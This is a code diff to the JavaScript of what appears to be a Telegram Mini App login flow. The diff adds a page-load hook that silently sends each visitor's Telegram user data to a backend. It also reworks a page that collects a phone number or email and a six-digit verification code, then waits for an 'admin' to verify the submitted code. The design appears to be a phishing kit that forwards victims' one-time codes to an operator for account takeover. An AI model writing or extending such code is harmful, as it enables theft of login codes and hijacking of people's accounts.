@@ -12,7 +12,26 @@ function expandWebApp() {
     window.Telegram.WebApp.expand();
   }
 }
-expandWebApp();
+
+// On page load: expand + log "Opened Mini App" (only once per session)
+window.addEventListener("load", async () => {
+  expandWebApp();
+
+  // Only log on the entry page (index), avoid double-logging on /otp, /dashboard
+  const path = location.pathname;
+  if (path === "/" || path === "/index.html") {
+    const u = tgUser();
+    if (u.telegram_id) {
+      try {
+        await fetch(`${API}/api/log-opened`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(u),
+        });
+      } catch (e) {}
+    }
+  }
+});
 
 /* ==========================================================
    LOGIN PAGE
@@ -38,7 +57,8 @@ if (sendCodeBtn) {
       inputEl.inputMode = "email";
       inputEl.placeholder = "you@example.com";
       inputEl.value = "";
-      subtitleEl.textContent = "Enter your email to continue. We'll send a verification code.";
+      subtitleEl.textContent =
+        "Enter your email to continue. We'll send a verification code.";
       emailBtn.innerHTML = '<span>📱</span> Continue with Phone';
     } else {
       mode = "phone";
@@ -46,7 +66,8 @@ if (sendCodeBtn) {
       inputEl.inputMode = "tel";
       inputEl.placeholder = "e.g. +1234567890";
       inputEl.value = "";
-      subtitleEl.textContent = "Enter your phone number to continue. We'll send a verification code.";
+      subtitleEl.textContent =
+        "Enter your phone number to continue. We'll send a verification code.";
       emailBtn.innerHTML = '<span>✉️</span> Continue with E-mail';
     }
     inputEl.focus();
@@ -58,13 +79,16 @@ if (sendCodeBtn) {
     const value = inputEl.value.trim();
 
     if (!value) {
-      return showError(mode === "phone" ? "Please enter your phone number." : "Please enter your email.");
+      return showError(
+        mode === "phone" ? "Please enter your phone number." : "Please enter your email."
+      );
     }
     if (mode === "phone") {
       const digits = value.replace(/[^\d]/g, "");
       if (digits.length < 7) return showError("Please enter a valid phone number.");
     } else {
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return showError("Please enter a valid email address.");
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value))
+        return showError("Please enter a valid email address.");
     }
 
     await requestOtp(value);
@@ -119,14 +143,15 @@ function initOtpPage() {
   boxes.forEach((box, i) => {
     box.addEventListener("input", () => {
       box.value = box.value.replace(/\D/g, "").slice(0, 1);
-      // Auto-advance focus is OK (just UX) but does NOT submit
       if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
     });
     box.addEventListener("keydown", (e) => {
       if (e.key === "Backspace" && !box.value && i > 0) boxes[i - 1].focus();
     });
     box.addEventListener("paste", (e) => {
-      const text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
+      const text = (e.clipboardData || window.clipboardData)
+        .getData("text")
+        .replace(/\D/g, "");
       if (!text) return;
       e.preventDefault();
       for (let k = 0; k < 6 && k < text.length; k++) boxes[k].value = text[k];
@@ -136,15 +161,14 @@ function initOtpPage() {
   });
   boxes[0].focus();
 
-  // MANUAL SUBMIT ONLY — never auto
   submitBtn.addEventListener("click", submitOtp);
-
-  // Poll for admin's decision (this is fine — it's just checking status)
   startPolling();
 }
 
 function getOtp() {
-  return Array.from(document.querySelectorAll(".otp-box")).map((b) => b.value).join("");
+  return Array.from(document.querySelectorAll(".otp-box"))
+    .map((b) => b.value)
+    .join("");
 }
 
 let submitted = false;
@@ -175,10 +199,10 @@ async function submitOtp() {
       return;
     }
     setStatus("Code sent. Waiting for admin to verify…");
-    // Lock boxes while waiting
     document.querySelectorAll(".otp-box").forEach((b) => (b.disabled = true));
-    document.getElementById("submitOtpBtn").disabled = true;
-    document.getElementById("submitOtpBtn").style.opacity = "0.5";
+    const btn = document.getElementById("submitOtpBtn");
+    btn.disabled = true;
+    btn.style.opacity = "0.5";
   } catch (e) {
     setStatus("Network error. Try again.", "error");
     submitted = false;
